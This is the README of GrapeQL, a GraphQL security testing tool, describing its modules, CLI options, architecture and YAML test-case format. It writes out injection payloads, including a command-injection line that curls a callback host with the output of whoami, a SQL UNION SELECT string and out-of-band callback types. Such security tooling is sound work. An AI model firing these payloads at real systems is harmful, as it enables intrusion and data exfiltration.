[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![MIT License](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

# GrapeQL

A comprehensive GraphQL security testing tool for detecting vulnerabilities in GraphQL APIs.

## Overview

GrapeQL is a modular GraphQL security scanner that identifies common vulnerabilities and misconfigurations in GraphQL endpoints. It ships with a command-line interface for quick assessments and a Python library for integration into custom security workflows. Test logic is driven by YAML definitions, making it easy to add new checks without touching code.

## Features

- **GraphQL Fingerprinting** — Identify the underlying GraphQL engine (Apollo, Hasura, Graphene, etc.) through behavioral probes
- **Information Disclosure Testing** — Detect introspection leaks, field suggestions, GraphiQL exposure, batch query support, and alternate transport acceptance
- **SQL Injection Testing** — Test all String/ID arguments across queries and mutations for SQL injection indicators
- **Command Injection Testing** — Test for OS command injection through GraphQL arguments
- **Out-of-Band (OOB) Injection** — Start a local TCP listener and inject callback payloads (curl, wget, SSRF) to detect blind injection and SSRF vulnerabilities that produce no in-band response
- **Authentication & Authorization Testing** — Header bypass, IDOR enumeration, and unauthenticated access checks
- **Denial of Service Testing** — Circular queries, deep nesting, field duplication, fragment bombs, and array batching
- **AI-Assisted Analysis** — Optionally send findings to Claude for an executive summary, risk analysis, and recommended next steps
- **YAML-Driven Test Cases** — All payloads, probes, and detection rules are defined in YAML for easy extension
- **Include Filtering** — Restrict a scan to specific YAML files with `--include` for targeted testing
- **Baseline-Aware DoS Detection** — Response times from all modules feed a statistical baseline; DoS findings use mean + 3σ thresholds instead of arbitrary cutoffs
- **Structured Logging** — Every request/response pair is logged with module, test name, payload, HTTP verb, status, and timing
- **Comprehensive Reporting** — Generate detailed reports in Markdown or JSON, optionally enriched with AI analysis

## Installation

```bash
# Clone the repository
git clone https://github.com/AleksaZatezalo/grapeql.git
cd grapeql

# Install in editable mode
pip install -e .
```

## Command Line Usage

```bash
# Basic scan (runs fingerprint, info, injection, and auth modules)
grapeql --api https://example.com/graphql

# Select specific modules
grapeql --api https://example.com/graphql --modules fingerprint injection

# Full scan including DoS (may impact target availability)
grapeql --api https://example.com/graphql --modules fingerprint info injection auth dos

# Use a pre-captured schema when introspection is disabled
grapeql --api https://example.com/graphql --schema-file schema.json

# Scan through a proxy with authentication
grapeql --api https://example.com/graphql --proxy 127.0.0.1:8080 --auth <token>

# Generate a Markdown report
grapeql --api https://example.com/graphql --report report.md

# JSON report with custom credentials and logging
grapeql --api https://example.com/graphql \
    --report results.json --report-format json \
    --username testuser --password testpass \
    --log-file scan.log

# Out-of-band injection with a local callback listener
grapeql --api http://localhost:5013/graphql \
    --modules injection \
    --listener-ip 172.17.0.1 --listener-port 4444

# Only run DVGA-specific OOB payloads
grapeql --api http://localhost:5013/graphql \
    --modules injection --include dvga_oob

# Combine multiple include filters
grapeql --api https://example.com/graphql \
    --modules injection --include sqli.yaml oob.yaml

# Full scan with AI-assisted analysis
grapeql --api https://example.com/graphql \
    --report report.md --ai-key sk-ant-api03-...

# AI analysis with operator guidance
grapeql --api https://example.com/graphql \
    --report report.md --ai-key sk-ant-api03-... \
    --ai-message "Focus on SSRF and auth bypass chains"

# Full kitchen-sink scan: OOB + AI + logging
grapeql --api http://localhost:5013/graphql \
    --modules fingerprint info injection auth \
    --listener-ip 172.17.0.1 --listener-port 4444 \
    --report report.md --ai-key sk-ant-api03-... \
    --ai-message "This is DVGA — focus on importPaste SSRF and RCE" \
    --log-file scan.log
```

### CLI Options

| Option | Description |
|---|---|
| `--api URL` | URL of the GraphQL endpoint to test (required) |
| `--modules [MODULE ...]` | Modules to run: `auth`, `dos`, `fingerprint`, `info`, `injection` (default: all except `dos`) |
| `--proxy HOST:PORT` | HTTP proxy address |
| `--auth TOKEN` | Authorization token |
| `--auth-type TYPE` | Token type prefix (default: `Bearer`) |
| `--cookie NAME:VALUE` | Cookie to include (repeatable) |
| `--schema-file PATH` | JSON introspection schema file; bypasses live introspection requirement |
| `--report FILEPATH` | Output file for the report |
| `--report-format FORMAT` | `markdown` (default) or `json` |
| `--username USERNAME` | Username for injection testing (default: `admin`) |
| `--password PASSWORD` | Password for injection testing (default: `changeme`) |
| `--log-file PATH` | Structured log output file; defaults to stdout |
| `--test-cases DIR` | Custom YAML test cases directory |
| `--include FILE [...]` | Only load these YAML files (basename, extension optional). Applies across all modules |
| `--listener-ip IP` | IP for the local OOB callback listener. Enables OOB injection testing |
| `--listener-port PORT` | Port for the local OOB callback listener. Enables OOB injection testing |
| `--ai-key KEY` | Anthropic API key for AI-assisted analysis |
| `--ai-message TEXT` | Free-form guidance passed to the AI agent |

## Architecture

GrapeQL follows a top-down modular design. The CLI orchestrator instantiates shared infrastructure (logger, loader, baseline tracker) and passes it to each module through a uniform interface. After all modules complete, an optional AI agent post-processes the findings before the reporter generates output.

```
┌─────────────────────────────────────────────────┐
│                   CLI (cli.py)                   │
│         Orchestration & argument parsing         │
└──────────────────────┬──────────────────────────┘
                       │
        ┌──────────────┼──────────────┐
        ▼              ▼              ▼
  ┌───────────┐  ┌───────────┐  ┌───────────┐
  │  Logger   │  │  Loader   │  │ Baseline  │
  │(logger.py)│  │(loader.py)│  │(baseline. │
  │           │  │           │  │   py)     │
  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘
        │              │              │
        └──────────────┼──────────────┘
                       │ injected into
                       ▼
            ┌─────────────────────┐
            │ VulnerabilityTester │  (tester.py)
            │     Base Class      │
            └──────────┬──────────┘
                       │ extends
         ┌─────────────┼─────────────┐
         ▼             ▼             ▼
   ┌────────────┬────────────┬────────────┬────────────┐
   │Fingerprint │  InfoTest  │ Injection  │  AuthTest  │
   │            │            │   Test     │            │
   └─────┬──────┴─────┬──────┴─────┬──────┴─────┬──────┘
         │            │            │            │
         │    response times flow into baseline │
         └────────────┴──────┬─────┴────────────┘
                             ▼
                      ┌────────────┐
                      │  DosTester │  reads baseline
                      └──────┬─────┘  threshold
                             │
                             ▼
                      ┌────────────┐
                      │  AI Agent  │  (optional, --ai-key)
                      │(ai_agent.  │  post-processes findings
                      │   py)      │
                      └──────┬─────┘
                             │
                             ▼
                      ┌────────────┐
                      │  Reporter  │
                      └────────────┘
```

### Execution Order

Modules always run in this order regardless of `--modules` argument order:

1. **Fingerprint** → populates baseline
2. **Info** → populates baseline
3. **Injection** → populates baseline (+ OOB listener if configured)
4. **Auth** → populates baseline
5. **DoS** → reads baseline threshold (mean + 3σ)
6. **AI Agent** → analyses all findings (if `--ai-key` provided)
7. **Reporter** → generates markdown/JSON output

### Core Components

| Component | File | Role |
|---|---|---|
| `GraphQLClient` | `client.py` | HTTP client with proxy, auth, cookie support, and structured logging |
| `VulnerabilityTester` | `tester.py` | Base class providing client setup, findings management, and baseline recording |
| `Fingerprinter` | `fingerprint.py` | Engine identification via behavioral probes |
| `InfoTester` | `info_tester.py` | Information disclosure checks |
| `InjectionTester` | `injection_tester.py` | SQL injection, command injection, and OOB testing |
| `AuthTester` | `auth_tester.py` | Authentication bypass, IDOR, and unauth access |
| `DosTester` | `dos_tester.py` | Denial of service via query complexity attacks |
| `AIAgent` | `ai_agent.py` | Post-scan AI analysis via Anthropic Messages API |
| `BaselineTracker` | `baseline.py` | Thread-safe response time statistics across modules |
| `TestCaseLoader` | `loader.py` | YAML test case discovery, parsing, and include filtering |
| `GrapeLogger` | `logger.py` | Structured logging with module/test/payload context |
| `Reporter` | `reporter.py` | Markdown and JSON report generation with optional AI summary |

### Test Cases Directory

```
test_cases/
├── fingerprint/    # Engine probe definitions
│   └── engines.yaml
├── info/           # Information disclosure checks
│   └── checks.yaml
├── injection/      # SQLi, command injection, and OOB payloads
│   ├── sqli.yaml
│   ├── command.yaml
│   ├── nosql.yaml
│   ├── oob.yaml          # Generic OOB callbacks (curl, wget, nc, etc.)
│   └── dvga_oob.yaml     # DVGA-specific OOB (importPaste SSRF, systemDiagnostics RCE)
├── auth/           # Authentication bypass strategies
│   └── bypasses.yaml
└── dos/            # DoS attack configurations
    └── attacks.yaml
```

## Out-of-Band (OOB) Testing

OOB testing detects blind vulnerabilities where injected payloads produce no visible change in the GraphQL response but trigger an outbound connection from the server. This covers blind command injection, SSRF, and blind SQL injection with out-of-band exfiltration.

### How It Works

1. GrapeQL starts a local TCP listener on the address you specify.
2. Payloads containing `CALLBACK`, `CALLBACK_HOST`, and `CALLBACK_PORT` placeholders are injected into query/mutation arguments.
3. If the server is vulnerable, it makes an outbound connection to your listener.
4. Any received connection is reported as a CRITICAL finding.

### Usage

The listener IP should be reachable from the target. If the target is a Docker container, use the Docker bridge IP (typically `172.17.0.1`). If the target is on the same LAN, use your LAN IP.

```bash
# Target in Docker
grapeql --api http://localhost:5013/graphql \
    --modules injection \
    --listener-ip 172.17.0.1 --listener-port 4444

# Target on LAN
grapeql --api http://192.168.1.50:5013/graphql \
    --modules injection \
    --listener-ip 192.168.1.100 --listener-port 9999
```

### OOB Payloads

Generic payloads in `oob.yaml` cover curl, wget, netcat, Python urllib, bash `/dev/tcp`, and nslookup. These are injected into every String/ID argument automatically.

Target-specific payloads (like `dvga_oob.yaml`) use raw queries for mutations that require multiple arguments to be set simultaneously — for example, `importPaste(host, port, path, scheme)` where all four args must be controlled together for the SSRF to fire.

### Writing Custom OOB Test Cases

Generic payload (injected into every arg):

```yaml
test_cases:
  - name: my_oob_curl
    oob: true
    payload: "; curl CALLBACK/my-test"
```

Raw query (sent verbatim — for multi-arg mutations):

```yaml
test_cases:
  - name: my_ssrf_test
    oob: true
    query: 'mutation { fetchUrl(host: "CALLBACK_HOST", port: CALLBACK_PORT, path: "/ssrf") { result } }'
```

## AI-Assisted Analysis

When `--ai-key` is provided, GrapeQL sends the collected findings to Claude for post-scan analysis. The AI agent produces a structured report appended to the standard output.

### Output Sections

The AI summary contains four sections:

1. **Executive Summary** — 2–4 sentences on overall security posture.
2. **Risk Analysis** — Real-world impact of critical/high findings, including attack chains.
3. **Recommended Next Steps** — Prioritised manual testing actions.
4. **Gaps in Coverage** — Common GraphQL attack classes the scanner may have missed.

### Usage

```bash
# Basic AI analysis
grapeql --api https://example.com/graphql \
    --report report.md --ai-key sk-ant-api03-...

# With operator guidance
grapeql --api https://example.com/graphql \
    --report report.md --ai-key sk-ant-api03-... \
    --ai-message "Focus on importPaste SSRF and command injection chains"
```

### API Key Setup

1. Visit [console.anthropic.com](https://console.anthropic.com).
2. Create an account or sign in.
3. Navigate to **API Keys** in the sidebar.
4. Click **Create Key** and copy it immediately (shown only once).
5. Add a payment method under **Billing** before the key will work.

## Include Filtering

The `--include` flag restricts which YAML test case files are loaded, allowing targeted scans without modifying the test cases directory. The filter applies globally across all modules.

```bash
# Only run DVGA OOB payloads (extension optional)
grapeql --api http://localhost:5013/graphql \
    --modules injection --include dvga_oob

# Multiple files
grapeql --api http://localhost:5013/graphql \
    --modules injection --include dvga_oob.yaml sqli.yaml

# Cross-module filtering
grapeql --api https://example.com/graphql \
    --include engines.yaml sqli.yaml checks.yaml
```

## Library Usage

All components are importable for use in custom scripts:

```python
import asyncio
from grapeql import (
    GraphQLClient, Fingerprinter, InjectionTester,
    InfoTester, DosTester, AuthTester, Reporter,
    GrapeLogger, TestCaseLoader, BaselineTracker,
)
from grapeql.ai_agent import AIAgent

async def scan():
    logger = GrapeLogger(log_file="scan.log")
    loader = TestCaseLoader("path/to/test_cases")
    baseline = BaselineTracker()

    client = GraphQLClient(logger=logger)
    client.set_endpoint("https://example.com/graphql")
    client.set_authorization("my-token")
    await client.introspection_query()

    # Run individual modules
    fp = Fingerprinter(logger=logger, loader=loader, baseline=baseline)
    await fp.setup_endpoint("https://example.com/graphql", pre_configured_client=client)
    await fp.run_test()

    inj = InjectionTester(logger=logger, loader=loader, baseline=baseline)
    await inj.setup_endpoint("https://example.com/graphql", pre_configured_client=client)
    inj.set_listener("10.0.0.5", 4444)  # Enable OOB testing
    await inj.run_test()

    # Collect findings
    reporter = Reporter()
    reporter.set_target("https://example.com/graphql")
    reporter.add_findings(fp.get_findings())
    reporter.add_findings(inj.get_findings())

    # Optional AI analysis
    agent = AIAgent(api_key="sk-ant-api03-...")
    all_findings = [f.to_dict() for f in fp.get_findings() + inj.get_findings()]
    summary = await agent.analyse("https://example.com/graphql", all_findings)
    if summary:
        reporter.set_ai_summary(summary)

    reporter.generate_report(output_format="markdown", output_file="report.md")

asyncio.run(scan())
```

## Writing Custom Test Cases

All test logic is defined in YAML. Drop a new `.yaml` file into the appropriate `test_cases/` subdirectory and GrapeQL picks it up automatically on the next scan.

### Injection Payload

```yaml
test_cases:
  - name: sqli_union_select
    payload: "' UNION SELECT null,null,null--"
    indicators:
      - "syntax error"
      - "UNION"
      - "column"
```

### OOB Payload

```yaml
test_cases:
  - name: oob_curl_exfil
    oob: true
    payload: "; curl CALLBACK/$(whoami)"
```

### Engine Fingerprint Probe

```yaml
test_cases:
  - engine_id: graphene
    name: Graphene (Python)
    url: https://graphene-python.org
    tech: [Python]
    probes:
      - query: "{ __typename @skip }"
        expect_error: "Directive 'skip' argument 'if'"
```

### Info Disclosure Check

```yaml
test_cases:
  - name: field_suggestions
    title: Field Suggestions Enabled
    severity: LOW
    method: POST
    query: "{ __schema { directive } }"
    detection:
      type: error_contains
      value: "Did you mean"
      case_insensitive: true
    description: "Field suggestions leak schema information."
    remediation: "Disable field suggestions in production."
```

See [DOCUMENTATION.md](DOCUMENTATION.md) for full details on every module, YAML schema, and configuration option.

## Author

Aleksa Zatezalo